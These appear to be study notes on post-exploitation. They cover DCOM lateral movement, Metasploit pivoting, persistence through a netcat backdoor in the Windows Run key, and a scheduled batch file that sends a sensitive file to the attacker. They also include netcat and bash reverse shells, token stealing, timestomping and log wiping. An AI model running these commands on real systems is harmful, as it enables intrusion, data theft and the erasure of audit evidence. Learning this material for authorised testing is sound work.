* Remote services are the most prominent for the Lateral movement.
* X window system is remote desktop connection to unix systems where it uses client-server model. it is not encrypted but by using X Forwarding it forwards traffic through ssh tunnel.
* Remote services like telnet,ssh are noticed by the administrators, to evade RPC/DCOM can be used.
* RPc enables the communication between local and remote process on windows,whereas DCOM enables communication between software components over an network.
* Lateral movement with RPC/DCOM:
                                $obj = [activator]::CreateInstance ([type]::GetTypeFromProgID ("MMC20.Application","192.168.1.50")
                                $obj.Document.ActiveView.ExecuteShellCommand ("C:\Windows\system32\calc.exe",$null,$null,"7")
                                
* pivoting using proxychains:
                            After opening a meterprter sesion with the target pivot, add the target subnet to routing table.
                            route add 10.8.0.0 255.255.255.0 1 (1 is the meterprter session)
                            run the Metasploit module auxiliary/server/socks4a to start a proxy server that uses Metasploit's routing table.
                            edit /etc/proxychains.conf to include socks4 127.0.0.1 1080
                            This instructs ProxyChains to use the proxy on localhost
                            lastly using proxychains we can run any command
                            
  * Pivoting from one hsot to another:( We gonna exploit VM that is present in the windows server)
                                      Isolate the particular VM from accessing using Host-only adapter.
                                      Gain a meterprter session on windows server using any of exploit
                                      adding route in metasploit: run post/multi/manage/autoroute
                                      Background the current meterpreter session
                                      Identify the IP address of the VM behind the host-only network : use post/multi/gather/ping_sweep: set RHOSTS Subnet session of VM which is in windows
                                      Verify that a vulnerable service is running on the VM : use auxiliary/scanner/portscan/tcp : set RHOSTS IP of VM 
                                      Gain remote access on the target VM by eploiting any vulnerability. RHOSTS to set is IP of VM.
                            
 * pivoting techniques:
                       port forwarding
                       ssh pivoting
                       vpn pivoting
                       modifying the routing table 
                       
 * Persistence techniques:
                            Creating new user
                            Remote access
                            Scheduled tasks
                            Backdoors
                            Shells
                           Services and daemons
   * Installing backdoor using Netcat:
                                      upload the netcat to exploited machine through /usr/share/windows-binaries/nc.exe if it is an windows machine.
                                      reg enumkey -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run - This particular path is used by Windows to execute programs on startup.
                                      reg setval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -v nc -d 'C:\Windows\nc.exe -l -p 1234 -e cmd.exe'.
                                      reg queryval -k HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run -v nc to verify that the key was successfully set.
                                      to open this nc listener in attacker pc: nc -v ExploitedMAchineIP POrtNumber
                  **Creating a batch file that steals the sesnitive file:
                          incase of windows pc, create  a bat file. 1.) @echo off 2.) C:\Windows\nc.exe -w 3 VulnIP POrtNO < C:\Contacts\LocationOfSensitiveFile
                          Upload this bat fiel to exploited machine
                          execute -f 'schtasks /create /tn tsk /tr C:\Windows\tsk.bat /sc minute /mo 3 /ru system' (Creates Scheduled task which sends info through nc every 3 mins).
                          In attacker machine, execute nc -l -p 1234 > contacts.csv
                           
 * the function of RAt is much similar to that of Remote access services, but the only difference is that RAT are desined to be hidden.
 * A bind shell is established when the target system "binds" its shell to a local network port. The problem with bind shell is that the port is commonly seen by firewalls and other systems.
        nc -lp 12345 -e /bin/sh - Target machine
        nc 192.168.1.50 12345 - Attacker machine
  * A reverse shell is established when the target machine communicates with an attack machine that is listening on a specific port. 
        nc -lp 12345(Attacker machine)
        nc 192.168.1.10 12345 â€“e /bin/sh (Target MAchine)
 * Using bash as a reverse shell to establishn the connection in linux systems: bash -i >& /dev/tcp/192.168.1.10/12345 0>&1
 * Netcat to create a relay using a Linux named pipe:
                                                     nc -lp 12345 (attacking machine)
                                                     nc -lp 54321 -e /bin/sh(second traget hsot)
                                                     mknod backpipe p nc 192.168.1.10 12345 0<backpipe | nc 192.168.1.100 54321 | tee backpipe(initial target host)
                                                     
 * Schedules tasks in windows: schtasks /create /tn backdr /tr C:\Files\backdoor.bat /sc DAILY /mo 30 /ru SYSTEM (task scheduler app can alsso be used)
 * Scheduled tasks in linux: 0 9 * * * nc -lp 12345 > data.txt (* wildcard denotes Month,Day,Date,Month,Day of week(0-6) Sunday=0 or 7).
 0 9 * * * jsmith nc -lp 12345 > data.txt - This runs the command as particular user.
 * Anti-forensics techniques:
                             Buffer overflow(Heap spraying)
                             Memory residents- some malware can be present in memory without the running of application.
                             Program packing- Packing the program with compression makes it difficult to assess until is unpacked.
                             Alternate data streams
                             
  * Acessing single meterpreter in two systems:
                                        first,exploit the vuln in one attacker machine and the current session in msf.
                                        Open a separate handler in second attacker machine using use exploit/multi/handler
                                        use exploit/windows/local/payload_inject : set LHOST as Another attacker machine : set DisablePayloadHandler true : set SESSION 1
                                        By running the above module meterprter session is passed to second attacker machine.
   * In meterpreter session, use this to change the timestamp of particular file timestomp message.txt -z "03/15/2017 09:04:31".
   * By stealing the token using Administrator service, new user can be created which looks like, it is created by admin. steal_token PID(Admin session).
   * By using clearev the logs will be cleared.
 * To clear logs in windows through metasploit:clearev, and,  wevtutil cl Application clears the application log.
  In Linux systems, use echo "" > /var/log/syslog   
                    sed -i '/backdr/d' /var/log/auth.log - clears the backdr appearing line and resr remains same.
  * LAteral movementy is similar to pivot but the difference is that, in lateral movement there is no prerequiste to compromise a pivot(first host in internal network).
 
                            
